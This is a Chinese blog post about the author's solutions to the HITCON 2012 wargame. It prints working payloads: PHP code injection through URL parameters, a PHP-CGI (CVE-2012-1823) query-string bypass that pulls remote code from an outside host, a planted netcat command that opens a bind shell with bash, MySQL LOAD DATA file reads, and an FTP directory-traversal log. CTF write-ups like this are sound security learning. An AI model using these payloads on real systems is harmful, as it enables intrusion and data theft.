---
layout: post
title: "HITCON 2012 Wargame Notes"
tags:
- hit
- hitcon
- note
- hack
- web
- wargame
- security
---

今年是第二年來 HITCON ，去年感謝 atdog 大大帶我一起報名 HITCON 玩 wargame ，
本來想說和去年一樣解解 QR code 我就很開心了，沒想到今年運氣不錯 XD

感謝同隊 crax 的組員： atdog xman jeffxx cyen hliu kvchung

Wargame 題目有大大幫忙備分了：[HITCON 2012 Wargame](http://rsghost.org/backup/wargame.hitcon.org/)

## Wargame 心得

這次因為運氣好，所以有幾題 web 都用爛招解掉了 XD
用和 hint 沒關係的解法繞掉其實解的有點心虛，下面是今年我有幫到一些忙的題目：

### Web 1

主要就是利用 `{${fucntion()}}` 來直接執行 php function ，本來想用 `file_get_contents()` 來讀 `key.php` 發現被擋掉了，
所以就試著用 `include()` 再用 `get_defined_vars()` 和 `var_dump()` 看有沒有設什麼變數，還好 `key.php` 是把 key 放在變數裡，
不然的話就要用其他方法去看 source 了。

    http://wg.hack.idv.tw/~ow100/orange.php?name=dm4&data={${include($_GET[key])}}{${var_dump(get_defined_vars())}}
    http://wg.hack.idv.tw/~ow100/yourfiles/dm4.config.php?key=../key.php

### Web 2

利用 Web 3 給的 `sqln00b/sqln00b` 可以登入 phpMyAdmin ，接著把 `key.php` LOAD 到任何一個 table 就可以了：

    CREATE TABLE web2 (src TEXT);
    LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;

### Web 4

從 `info.php` 發現 `Server API: CGI` 想到應該是在說今年的 [PHP CGI vulnerability](http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/)
，這東西今年出來的時候有看一下，不過其實還是在解題的時候才真的看懂 XD

在 `htaccess.txt` 裡可以看到

    RewriteCond %{QUERY_STRING} \-|\-d[a-z_]+%3d|%2d[a-z_]+%3d [NC]

發現 `%2d` 擋的比較鬆，所以研究了一下可以用

    http://wg.hack.idv.tw/~w100/info.php?%2dd+allow_url_include%3dOn+%2dd+auto_prepend_file%3dhttp://myhost/a.txt

來做 remote code execution ，試了一下就可以發現要找的東西在 `../key.txt` ，所以在 `a.txt` 這樣寫就可以讓它噴 key 了：

    <?php
        system('cat ../key.txt');
        exit();
    ?>

本來以為這題這樣就結束了，不過我們想到既然可以用 `cat` ，搞不好這題可以......

    <?php
        system('nc -l -p 5566 -e /bin/bash');
        exit();
    ?>

然後......

    [~] $ nc wg.hack.idv.tw 5566
    id
    uid=1002(w100) gid=33(www-data) groups=1002(w100),33(www-data)

### Web 3

這題看 hint 應該是要用 mysql client 的 `system` 來解，不過我們利用 Web 4 拿到的 back connect shell
可以發現要找的東西是 `/home/my100/key.txt` ，所以一樣用：

    CREATE TABLE web3 (src TEXT);
    LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;

就可以在 Web 2 的 phpMyAdmin 看到 key 囉~

### Web 6

也是用爛招...... 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 `/home/a200/public_html/index.php`
裡面會判斷如果用 `admin` 登入的話，會噴 base64 encode 之後的 key

### Potent Pwnables 2

`nmap` 完之後發現有開 ftp ，查了一下發現有 [Serv-U FTP Jail Break](http://www.exploit-db.com/exploits/18182/)
和 hint 一模一樣應該就是它了吧 XD 不過那時候肚子太餓又找不到怎麼登入 ftp ，把連結跟 atdog 說了之後我就出去吃點心，
回來之後就被解掉了，id/pw 好像就是 `hitcon2012/hitcon2012` ，隊友好強啊！

關鍵是 `Plz Input "Your" Real ID:` 要用 `wargame.hitcon.org` 的帳號去 generate key.txt 接下來就：

    [~] ➟  ftp jumpochisun.blogsyte.com
    Connected to jumpochisun.blogsyte.com.
    220 Serv-U FTP Server v6.4 for WinSock ready...
    Name (jumpochisun.blogsyte.com:dm4): hitcon2012
    331 User name okay, need password.
    Password: 
    230 User logged in, proceed.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> get ..:/..:/..:/..:/key/dm4key.txt key.txt
    local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
    227 Entering Passive Mode (114,36,241,246,15,231)
    150 Opening BINARY mode data connection for dm4key.txt (28 Bytes).
    100% |**************************************************|    28      179.89 KiB/s    00:00 ETA
    226 Transfer complete.
    28 bytes received in 00:00 (0.80 KiB/s)



剩下的時間都在試著解 Web 5 ，以及一直看 [駭客觀察日記](http://www.youtube.com/watch?v=l2dvg3KJoPo)
不過看到結束還是沒找到應該怎麼解......

再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！

爽啊！

<a href="http://www.flickr.com/photos/51077287@N06/7635469218/" title="Flickr 上 sunrisedm4 的 hitcon-2012-wargame-socre"><img src="http://farm9.staticflickr.com/8426/7635469218_ee0dbce135.jpg" width="500" height="225" alt="hitcon-2012-wargame-socre"></a>
